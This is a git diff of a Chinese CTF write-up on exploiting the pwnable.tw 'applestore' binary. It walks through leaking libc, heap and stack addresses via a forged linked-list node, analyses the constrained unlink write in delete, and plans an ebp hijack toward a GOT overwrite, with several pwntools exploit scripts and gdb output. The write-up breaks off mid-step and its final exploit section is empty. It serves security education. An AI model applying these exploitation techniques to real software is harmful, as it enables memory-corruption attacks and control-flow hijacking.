@@ -257,9 +257,9 @@ int __cdecl insert(int a1)
 }
 ```
 
-- 第一次购买手机加入购物车时，myCart往后这0x10字节的内存（位于bss段）都是0。所以i就是myCart的地址，`i[2]`为0，跳出循环。然后将`i[2]`也就是`*(&myCart+2)`赋值为create返回的堆块的地址。然后将堆块偏移12即，堆块最后4个字节赋值为i，即&myCart。
-- 第二次购买手机加入购物车时，for循环第一次不跳出，因为上一次`i[2]`有值，为上一次create的堆块的地址，所以根据for的赋值语句，i赋值为上一个堆块的起始地址，然后将`i[2]`，也就是上一个堆块的第三个4字节赋值为当前堆块的首地址。最后将当前堆块的最后四个字节赋值为前一个堆块的首地址。
-- 以此类推，大概明白了，myCart是16个字节，每次create的堆块也是16个字节，insert相当于把每次添加进购物车的手机组织成一个不循环的双链表，每次添加一个手机就是往双链表最后添加一个节点，具体这个双链表的数据结构我们之后讨论
+1. 第一次购买手机加入购物车时，myCart往后这0x10字节的内存（位于bss段）都是0。所以i就是myCart的地址，`i[2]`为0，跳出循环。然后将`i[2]`也就是`*(&myCart+2)`赋值为create返回的堆块的地址。然后将堆块偏移12即，堆块最后4个字节赋值为i，即&myCart。
+2. 第二次购买手机加入购物车时，for循环第一次不跳出，因为上一次`i[2]`有值，为上一次create的堆块的地址，所以根据for的赋值语句，i赋值为上一个堆块的起始地址，然后将`i[2]`，也就是上一个堆块的第三个4字节赋值为当前堆块的首地址。最后将当前堆块的最后四个字节赋值为前一个堆块的首地址。
+3. 以此类推，myCart是16个字节，每次create的堆块也是16个字节，insert相当于把每次添加进购物车的手机组织成一个不循环的双链表，每次添加一个手机就是往双链表最后添加一个节点，具体这个双链表的数据结构我们之后讨论
 
 ### delete
 
@@ -319,7 +319,7 @@ bk[2]=fd
 
 ### cart
 
-确认输入的是不是字符y，如果是，则遍历双链表打印购物车内容，返回购物车内商品总价格
+确认输入的是不是字符y，如果是，则遍历双链表打印购物车内容，返回购物车内商品总价格。这些能打印的函数，在题目中一般都可以用作信息泄露。
 
 ```c
 int cart()
@@ -454,7 +454,7 @@ io.interactive()
 '26: iPhone 6 Plus - $299\n'
 '*: iPhone 8 - $1\n'
 ```
-不过在脚本最后我用的`io.interactive()`，我们可以继续跟程序交互，我们再次执行4号选项，即打印购物车列表，发现程序崩溃了：
+在脚本最后采用`io.interactive()`，我们可以继续跟程序交互，再次执行4号选项，即打印购物车列表，发现程序崩溃了：
 
 ```bash
 26: iPhone 6 Plus - $299
@@ -479,11 +479,311 @@ io.interactive()
 
 ### 泄露libc基址和heap段地址
 
+有了这个漏洞能控制构造一个伪造的节点，我们能做些什么呢？首先一般是信息泄露，本题我们可以首先泄露libc基址，以及堆段的地址。不过泄露有啥用呢？暂时看不出来。我们通过cart函数便可以打印双链表的一些数据，并且我们控制第27个节点，即栈上的内存。我们可以构造如下节点：
+
+- 前四个字节为漏洞程序的GOT表中一项的地址
+- 再四个字节随意
+- 再四个字节为&myCart+2，即0x804B070
+- 最后四个字节随意
+
+即：`payload = 'y\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32()`，如图的stack节点，构造完之后的链表结构如下，bk回边未画出：
+
+```
+                   stack                          bss                            heap
+
+
+           +--------------------+        +--------------------+         +--------------------+
+           |                    |        |                    |         |                    |
+     +---->+   ELF.GOT['puts']  |        |      myCart        |    +--->+      &name         |    +---->
+     |     |                    |        |                    |    |    |                    |    |
+     |     +--------------------+        +--------------------+    |    +--------------------+    |
+     |     |                    |        |                    |    |    |                    |    |
+     |     |                    |        |                    |    |    |                    |    |
+     |     |                    |        |                    |    |    |                    |    |
+     |     +--------------------+        +--------------------+    |    +--------------------+    |
+     |     |                    |        |                    |    |    |                    |    |
++----+     |   &myCart + 2      +-------->        fd          +----+    |       fd           +----+
+           |                    |        |                    |         |                    |
+           +--------------------+        +--------------------+         +--------------------+
+           |                    |        |                    |         |                    |
+           |                    |        |                    |         |       bk           |
+           |                    |        |                    |         |                    |
+           +--------------------+        +--------------------+         +--------------------+
+                                         |                    |
+                                         |   fake fd (null)   |
+                                         |                    |
+                                         +--------------------+
+                                         |                    |
+                                         |                    |
+                                         |                    |
+                                         +--------------------+
+```
+
+构造如上节点后，cart函数在遍历打印的时候，遍历到第27个节点时，就会按照我们构造的数据去执行打印，并继续遍历，所以就会把`ELF.GOT['puts']`地址处的内容打印出来，在减去libc中puts函数的偏移就能泄露出来libc的基址。在继续遍历的时候就会将`&myCart + 2`的地址处识别为一个节点的开头，然后打印这个节点第一个元素所指向的内存，作为第28个节点的打印数据。这个指针本身是指向第一个节点，所以我们就会把第1个节点的数据打印出来直到遇到0x00。第1个节点的前四个字节是asprintf出来的堆块的地址，存储着iphone6这类的字符串。这个地址和堆空间其起始的地址偏移是固定的，所以我们也可以泄露出来堆段的地址。但是我们不知道偏移的具体大小，需要调试，这里我们需要使用本地的libc的信息，32位的一般位于`/lib/i386-linux-gnu/libc.so.6`：
+
+
+```python
+from pwn import *
+context(arch='i386',os='linux',log_level='debug')
+myelf = ELF('applestore')
+libc = ELF('../../my_ubuntu32_libc.so')
+io = process(myelf.path)
+
+add = '2';delete='3';cart='4';checkout='5'
+
+def action(num,payload):
+        io.sendlineafter('> ',num)
+        io.sendlineafter('> ',payload)
+for i in range(6):
+        action(add,'1')
+for i in range(20):
+        action(add,'2')
+action(checkout,'y')
+
+payload = 'y\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)
+action(cart,payload)
+
+io.recvuntil('27: ')
+libc_addr = u32(io.recv(4))-libc.symbols['puts']
+io.recvuntil('28: ')
+heap_addr = u32(io.recv(4))
+
+log.warn('libc_addr: 0x%x' % libc_addr)
+log.warn('heap_addr: 0x%x' % heap_addr)
+
+gdb.attach(io,"b * 0x8048beb")
+io.interactive()
+```
+
+打印出来的地址如下：
+
+```python
+[!] libc_addr: 0xf7de2000
+[!] heap_addr: 0x9ffe490
+```
+然后在gdb的调试窗口里通过vmmap命令查看libc起始地址，我们的计算正确：
+
+```python
+gef➤  vmmap
+Start      End        Offset     Perm Path
+0xf7de2000 0xf7f92000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so
+```
+
+然后查看堆块的地址，第一个堆块的数据地址为0x09ffe008，32位下减去8字节的heap header，所以堆空间的起始地址就是0x09ffe000
+
+```python
+gef➤  heap chunks
+Chunk(addr=0x9ffe008, size=0x408, flags=PREV_INUSE)
+    [0x09ffe008     3e 20 3a 20 90 e4 ff 09 c7 20 2d 20 24 30 0a 08 
+```
+
+故我们泄露出的地址0x9ffe490比堆空间的起始地址多了0x490的偏移，故修正堆的地址：
+
+```python
+io.recvuntil('27: ')
+libc_addr = u32(io.recv(4)) - libc.symbols['puts']
+io.recvuntil('28: ')
+heap_addr = u32(io.recv(4)) - 0x490
+```
+
+至于这个偏移为啥是固定的，我认为应该是程序每次的堆操作都是固定的，所以偏移也是固定的。这个偏移中还存在着asprintf的堆操作，所以不同版本的libc可能偏移时不同的，但是同一个libc下应该是固定的。
+
 ### 泄露栈地址
+
+有了堆段的地址后，我们还可以泄露出当前栈的地址（目前还是不知道为什么要泄露栈地址，反正一顿泄露就对了），因为第26个节点的fd存放的就是第27个节点的地址，所以我们只要找到第26个节点的fd的地址，然后再次利用cart函数即可泄露出栈地址。我们继续在刚刚的gdb窗口中按c，然后在和程序交互输入1，即可断到设置的断点(0x8048beb)上，然后查看esp和ebp，以及观察堆上的chunks：
+
+```python
+gef➤  heap chunks
+...
+Chunk(addr=0x9ffe8a8, size=0x18, flags=PREV_INUSE)
+    [0x09ffe8a8     c0 e8 ff 09 2b 01 00 00 28 32 cc ff 90 e8 ff 09    ....+...(2......]
+Chunk(addr=0x9ffe8c0, size=0x18, flags=PREV_INUSE)
+    [0x09ffe8c0     69 50 68 6f 6e 65 20 36 20 50 6c 75 73 00 00 00    iPhone 6 Plus...]
+Chunk(addr=0x9ffe8d8, size=0x10, flags=PREV_INUSE)
+    [0x09ffe8d8     69 50 68 6f 6e 65 20 38 00 00 00 00 29 00 00 00    iPhone 8....)...]
+Chunk(addr=0x9ffe8e8, size=0x28, flags=PREV_INUSE)
+    [0x09ffe8e8     b0 47 f9 f7 b0 47 f9 f7 00 00 00 00 11 07 02 00    .G...G..........]
+Chunk(addr=0x9ffe910, size=0x18, flags=)
+    [0x09ffe910     69 50 68 6f 6e 65 20 36 20 50 6c 75 73 00 00 00    iPhone 6 Plus...]
+Chunk(addr=0x9ffe928, size=0x206e0, flags=PREV_INUSE)  ←  top chunk
+gef➤  p $esp
+$5 = (void *) 0xffcc3250
+gef➤  p $ebp
+$6 = (void *) 0xffcc3288
+```
+
+可以看到0x9ffe8a8这个堆块的第3个4字节处为0xffcc3228，位于栈空间，这个位置为0x9ffe8a8+0x8=0x9ffe8b0，距离堆段的偏移为：0x9ffe8b0-0x9ffe000=0x8b0，故我们构造堆段起始地址heap_adrr+0x8b0为payload，即可泄露位于栈空间的第27个节点的地址：
+
+```python
+from pwn import *
+context(arch='i386',os='linux',log_level='debug')
+myelf = ELF('applestore')
+libc = ELF('../../my_ubuntu32_libc.so')
+io = process(myelf.path)
+
+add = '2';delete='3';cart='4';checkout='5'
+
+def action(num,payload):
+        io.sendlineafter('> ',num)
+        io.sendlineafter('> ',payload)
+for i in range(6):
+        action(add,'1')
+for i in range(20):
+        action(add,'2')
+action(checkout,'y')
+
+payload = 'y\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)
+action(cart,payload)
+
+io.recvuntil('27: ')
+libc_addr = u32(io.recv(4))-libc.symbols['puts']
+io.recvuntil('28: ')
+heap_addr = u32(io.recv(4))-0x490
+
+payload = 'y\x00'+p32(heap_addr+0x8b0)+p32(1)+p32(0x0804B070)+p32(1)
+action(cart,payload)
+io.recvuntil('27: ')
+stack_addr = u32(io.recv(4))
+
+log.warn('libc_addr: %x' % libc_addr)
+log.warn('heap_addr: %x' % heap_addr)
+log.warn('stack_addr: %x' % stack_addr)
+
+gdb.attach(io,"b * 0x8048beb")
+io.interactive()
+```
 
 ### delete一次有约束的地址写
 
+之前提到了在delete时存在一次内存写操作，假如p为指向要删除的节点的指针，则内存的变化，可抽象的表示：
+
+```c
+p -> fd -> bk = p -> bk
+p -> bk -> fd = p -> fd
+```
+
+加上这个节点本身的数据结构的条件，内存的变化即为：
+
+```c
+fd[3]=bk
+bk[2]=fd
+```
+
+第27个节点的数据是完全可控的，即delete的时候fd，bk。现在我们已知了libc基址，堆段起始地址，栈地址。我们可以做什么？我是否可以只利用泄露出的libc基址，然后将GOT的某项覆盖为libc中system函数的地址呢？例如：当delete执行完之后还要回到handler函数，输入后会执行atoi函数，我希望把`GOT['atoi']`换成`libc_base+libc.symbols['system']`，即把GOT表中的atoi的表项换成libc中的system函数的地址即：
+
+``c
+* atoi@got = system@libc
+```
+
+为满足上面的约束条件可以有两种情况：
+
+```python
+(第一种)
+令: fd[3] = * atoi@got , bk = system@libc
+即: fd + 0xc = atoi@got , bk = system@libc
+即: fd = atoi@got - 0xc , bk = system@libc
+故: fd[3] = bk , 即完成* atoi@got = system@libc赋值操作
+
+但: bk[2] = * (system@libc + 2)
+若: bk[2] = fd , 进行赋值
+则: * (system@libc + 2) = atoi@got - 0xc，即对libc中的system函数进行写操作，代码段是只读的，程序会崩溃
+
+
+(第二种)
+令: bk[2] = * atoi@got , fd = system@libc
+即: bk + 0x8 = atoi@got , fd = system@libc
+即: bk = atoi@got - 0x8 , fd = system@libc
+故: bk[2] = fd , 即完成* atoi@got = system@libc赋值操作
+
+但: fd[3] = * (system@libc + 3)
+若: fd[3] = bk , 进行赋值
+则: * (system@libc + 3) = atoi@got - 0x8，即对libc中的system函数进行写操作，代码段是只读的，程序会崩溃
+```
+
+所以通过delete是不能直接去修改GOT表的，两种情况下都会使得程序崩溃。而且，对于这种约束的内存写是无法直接修改间接跳转处为我们利用的函数地址，因为对于我们要利用的函数地址，其+2或者+3的处的地址一定是只读的。所以理论上没有可读可写可执行的代码段，我们没有办法直接利用这种有约束的内存写来劫持程序流。那么我们还能怎么办呢？
+
 ### 劫持ebp并覆盖GOT表
+
+之前说过，二进制漏洞利用的过程，就是一步步扩大可以控制的内存的范围。我们现在可以控制的内存或者说可以写的内存，有两部分：
+
+1. 进入一些函数时的部分栈空间
+2. 整个内存中满足上述约束的内存
+
+那其实我们的思路就是利用满足约束条件的内存，即部分二的内存，配合相应程序逻辑，进而扩大部分一。
+
+具体来说，部分一的内存空间是由进入函数后栈空间，而且本题可控的栈内存是根据进入函数的ebp寄存器进行寻址。而ebp寄存器会在函数leave时，恢复为栈中之前保存的old_ebp，如果我们能想办法修改old_ebp，则可能在delete函数返回到handler函数后，控制栈的基址。如果我们将栈的基址劫持到GOT表附近，则可能通过输入控制栈，即控制GOT表，最终实现控制流劫持。
+
+那我们先来尝试劫持ebp到GOT表底部（因为栈是由高地址向低地址增长，ebp是栈底）。我们是通过delete函数满足约束条件的去写old_ebp，为GOT表的地址。首先想到GOT表位于可写的段，所以GOT表+2,+3的地址是data段，也是可写的，并不会崩溃，条件成立。那我们首先需要知道在delete函数返回前old_ebp的地址，泄我们露出的第27个节点的地址，在checkout函数中，距离当时的ebp的偏移为-0x20。根据本题的栈平衡，进入delete函数后，这个第27个节点的地址距离ebp的偏移仍然是-0x20，即old_ebp所在的内存位置为泄露出的栈地址+0x20。所以我们尝试将断点断在泄露完栈地址后的delete函数中，然后触发delete方法看看：
+
+```python
+from pwn import *
+context(arch='i386',os='linux',log_level='debug')
+myelf = ELF('applestore')
+libc = ELF('../../my_ubuntu32_libc.so')
+io = process(myelf.path)
+# libc = ELF("./libc_32.so.6")
+# io = remote("chall.pwnable.tw",10104)
+
+add = '2';delete='3';cart='4';checkout='5'
+
+def action(num,payload):
+        io.sendlineafter('> ',num)
+        io.sendlineafter('> ',payload)
+for i in range(6):
+        action(add,'1')
+for i in range(20):
+        action(add,'2')
+action(checkout,'y')
+
+payload = 'y\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)
+action(cart,payload)
+
+io.recvuntil('27: ')
+libc_addr = u32(io.recv(4))-libc.symbols['puts']
+io.recvuntil('28: ')
+heap_addr = u32(io.recv(4))-0x490
+
+payload = 'y\x00'+p32(heap_addr+0x8b0)+p32(1)+p32(0x0804B070)+p32(1)
+action(cart,payload)
+io.recvuntil('27: ')
+stack_addr = u32(io.recv(4)) 
+old_ebp = stack_addr + 0x20
+
+log.warn('libc_addr: 0x%x' % libc_addr)
+log.warn('heap_addr: 0x%x' % heap_addr)
+log.warn('stack_addr: 0x%x' % stack_addr)
+log.warn('old_ebp: 0x%x' % old_ebp)
+
+gdb.attach(io,"b * 0x080489C0")
+action(delete,"1")
+io.interactive()
+```
+
+打印结果为：
+
+```
+[!] libc_addr: 0xf7d0b000
+[!] heap_addr: 0x9e54000
+[!] stack_addr: 0xff8866f8
+[!] old_ebp: 0xff886718
+```
+
+gdb按一下c，然后打印ebp寄存器
+
+```c
+[#0] 0x80489c0 → delete()
+[#1] 0x8048c46 → handler()
+[#2] 0x8048cf5 → main()
+────────────────────────────────────────────────────────────────────────────────
+gef➤  p $ebp
+$1 = (void *) 0xff886718
+```
+
+可见的确，进入到delete函数中的ebp和在checkout中的ebp是相同的。那么我们便可以劫持ebp到GOT表底部，即`* ebp = `
+
+
+
+
 
 ### 完整exp
 
